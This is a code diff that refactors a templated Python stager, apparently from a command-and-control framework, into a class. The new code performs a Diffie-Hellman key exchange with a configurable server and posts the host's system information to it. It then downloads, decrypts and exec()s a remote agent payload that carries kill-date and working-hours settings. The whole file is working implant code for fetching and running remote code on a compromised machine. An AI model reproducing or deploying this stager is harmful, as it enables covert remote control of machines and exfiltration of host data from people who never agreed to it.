@@ -13,94 +13,80 @@ import random
 import string
 import urllib.request
 
-{% include 'common/rc4.py' %}
 {% include 'common/aes.py' %}
+{% include 'common/rc4.py' %}
 {% include 'common/diffiehellman.py' %}
 {% include 'common/get_sysinfo.py' %}
-{% include 'common/sockschain.py' %}
 {% include 'http/comms.py' %}
 
-def post_message(uri, data):
-    global headers
-    return (urllib.request.urlopen(urllib.request.Request(uri, data, headers))).read()
 
-# generate a randomized sessionID
-sessionID = b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))
+class Stage:
+    def __init__(self):
+        self.staging_key = b'{{ staging_key }}'
+        self.profile = '{{ profile }}'
+        self.server = '{{ host }}'
+        self.kill_date = '{{ kill_date }}'
+        self.working_hours = '{{ working_hours }}'
 
-# server configuration information
-stagingKey = b'{{ staging_key }}'
-profile = '{{ profile }}'
-WorkingHours = '{{ working_hours }}'
-KillDate = '{{ kill_date }}'
+        if self.server.startswith("https"):
+            hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None
 
-parts = profile.split('|')
-taskURIs = parts[0].split(',')
-userAgent = parts[1]
-headersRaw = parts[2:]
+        self.session_id = self.generate_session_id()
+        self.key = None
+        self.headers = self.initialize_headers(self.profile)
+        self.packet_handler = ExtendedPacketHandler(None, staging_key=self.staging_key, session_id=self.session_id, headers=self.headers, server=self.server, taskURIs=self.taskURIs)
 
-# global header dictionary
-#   sessionID is set by stager.py
-# headers = {'User-Agent': userAgent, "Cookie": "SESSIONID=%s" % (sessionID)}
-headers = {'User-Agent': userAgent}
-try:
-    headers['Hop-Name'] = hop
-except:
-    pass
+    @staticmethod
+    def generate_session_id():
+        return b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))
 
-# parse the headers into the global header dictionary
-for headerRaw in headersRaw:
-    try:
-        headerKey = headerRaw.split(":")[0]
-        headerValue = headerRaw.split(":")[1]
-        if headerKey.lower() == "cookie":
-            headers['Cookie'] = "%s;%s" % (headers['Cookie'], headerValue)
-        else:
-            headers[headerKey] = headerValue
-    except Exception:
-        pass
+    def initialize_headers(self, profile):
+        parts = profile.split('|')
+        self.taskURIs = parts[0].split(',')
+        userAgent = parts[1]
+        headersRaw = parts[2:]
+        headers = {'User-Agent': userAgent}
+        for headerRaw in headersRaw:
+            try:
+                headerKey, headerValue = headerRaw.split(":")
+                headers[headerKey] = headerValue
+            except Exception:
+                pass
+        return headers
 
-# stage 3 of negotiation -> client generates DH key, and POSTs HMAC(AESn(PUBc)) back to server
-clientPub=DiffieHellman()
-public_key = str(clientPub.publicKey).encode('UTF-8')
-hmacData=aes_encrypt_then_hmac(stagingKey,public_key)
+    def execute(self):
+        # Diffie-Hellman Key Exchange
+        client_pub = DiffieHellman()
+        public_key = str(client_pub.publicKey).encode('UTF-8')
+        hmac_data = aes_encrypt_then_hmac(self.staging_key, public_key)
 
-# RC4 routing packet:
-#   meta = STAGE1 (2)
-routingPacket = build_routing_packet(stagingKey=stagingKey, sessionID=sessionID, meta=2, encData=hmacData)
+        # Build and Send Routing Packet
+        routing_packet = self.packet_handler.build_routing_packet(staging_key=self.staging_key, session_id=self.session_id, meta=2, enc_data=hmac_data)
+        post_uri = self.server + "{{ stage_1 | default('/index.jsp', true) | ensureleadingslash }}"
+        response = self.packet_handler.post_message(post_uri, routing_packet)
 
-try:
-    postURI = server + "{{ stage_1 | default('/index.jsp', true) | ensureleadingslash }}"
-    # response = post_message(postURI, routingPacket+hmacData)
-    response = post_message(postURI, routingPacket)
-except Exception:
-    exit()
+        # Decrypt Server Response
+        packet = aes_decrypt_and_verify(self.staging_key, response)
+        nonce, server_pub = packet[0:16], int(packet[16:])
 
-# decrypt the server's public key and the server nonce
-packet = aes_decrypt_and_verify(stagingKey, response)
-nonce = packet[0:16]
-serverPub = int(packet[16:])
+        # Generate Shared Secret
+        client_pub.genKey(server_pub)
+        self.key = client_pub.key
+        self.packet_handler.key = self.key
 
-# calculate the shared secret
-clientPub.genKey(serverPub)
-key = clientPub.key
+        # Send System Info
+        post_uri = self.server + "{{ stage_2 | default('/index.php', true) | ensureleadingslash}}"
+        hmac_data = aes_encrypt_then_hmac(self.key, get_sysinfo(nonce=str(int(nonce) + 1)).encode('UTF-8'))
+        routing_packet = self.packet_handler.build_routing_packet(staging_key=self.staging_key, session_id=self.session_id, meta=3, enc_data=hmac_data)
+        response = self.packet_handler.post_message(post_uri, routing_packet)
 
-# step 5 -> client POSTs HMAC(AESs([nonce+1]|sysinfo)
-postURI = server + "{{ stage_2 | default('/index.php', true) | ensureleadingslash}}"
-hmacData = aes_encrypt_then_hmac(key, get_sysinfo(nonce=str(int(nonce)+1)).encode('UTF-8'))
+        # Decrypt and Execute Agent
+        agent_code = aes_decrypt_and_verify(self.key, response)
+        exec(agent_code, globals())
+        agent = MainAgent(packet_handler=self.packet_handler, profile=self.profile, server=self.server, session_id=self.session_id, kill_date=self.kill_date, working_hours=self.working_hours)
+        self.packet_handler.agent = agent
+        agent.run()
 
-# RC4 routing packet:
-#   sessionID = sessionID
-#   language = PYTHON (2)
-#   meta = STAGE2 (3)
-#   extra = 0
-#   length = len(length)
-routingPacket = build_routing_packet(stagingKey=stagingKey, sessionID=sessionID, meta=3, encData=hmacData)
-
-response = post_message(postURI, routingPacket)
-
-# step 6 -> server sends HMAC(AES)
-agent = aes_decrypt_and_verify(key, response)
-agent = agent.replace('{{ working_hours }}', WorkingHours)
-agent = agent.replace('{{ kill_date }}', KillDate)
-
-exec(agent)
+# Initialize and Execute Agent
+stage = Stage()
+stage.execute()
